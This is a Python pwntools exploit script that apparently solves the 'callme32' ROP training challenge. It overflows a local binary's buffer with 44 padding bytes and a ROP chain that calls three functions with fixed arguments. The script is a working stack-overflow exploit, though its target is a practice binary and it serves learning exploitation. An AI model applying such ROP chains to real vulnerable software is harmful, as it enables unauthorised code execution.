#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./callme32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './callme32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x0804874e
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'

io = start()

offset = 44
arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d

rop = ROP(exe)
rop.callme_one(arg1, arg2, arg3)
rop.callme_two(arg1, arg2, arg3)
rop.callme_three(arg1, arg2, arg3)

payload = 44 * b'a' + rop.chain()

io.sendlineafter(b'> ', payload)

io.interactive()

